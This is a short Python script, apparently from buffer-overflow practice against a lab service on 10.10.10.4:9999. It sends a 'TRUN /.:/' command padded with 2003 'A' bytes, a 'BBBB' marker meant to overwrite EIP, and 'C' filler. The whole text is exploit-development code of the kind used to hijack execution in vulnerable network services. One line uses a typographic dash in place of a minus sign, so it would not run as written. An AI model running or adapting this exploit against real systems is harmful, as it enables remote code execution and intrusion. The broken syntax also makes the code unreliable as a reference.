import socket
s = socket.socket()
s.connect(("10.10.10.4",9999))
leng = 2984
offset = 2003
eip = b"BBBB"
payload = [b"TRUN /.:/",b"A"*offset,eip,b"C"*(leng – offset -len(eip))]
payload = b"".join(payload)
s.send(payload)
s.close()
